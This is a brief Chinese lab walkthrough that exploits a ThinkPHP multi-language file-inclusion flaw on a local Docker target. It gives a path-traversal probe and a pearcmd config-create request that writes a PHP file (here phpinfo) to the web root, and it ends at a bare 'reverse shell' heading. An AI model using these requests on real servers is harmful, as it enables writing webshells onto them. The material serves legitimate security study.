启动靶场：
```
docker compose up -d
```

首先文件包含漏洞存在的话需要满足两个条件：
1. PHP环境安装了`register_argc_argv`
2. PHP环境安装了`pcel/pear`
现在环境满足条件

然后ThinkPHP多语言特性不是默认开启的，所以还要再确定文件包含漏洞是否存在：
进burpsuite：
```
GET /?lang=../../../../../public/index HTTP/1.1
```
！注意是五个`../`
如果漏洞存在，则服务器会出错。返回500界面

一切准备就绪后写shell.php文件：
```warp-runnable-command
GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php HTTP/1.1
```

然后访问
```
http://localhost:18080/shell.php
```
进入PHP信息页面

反弹shell
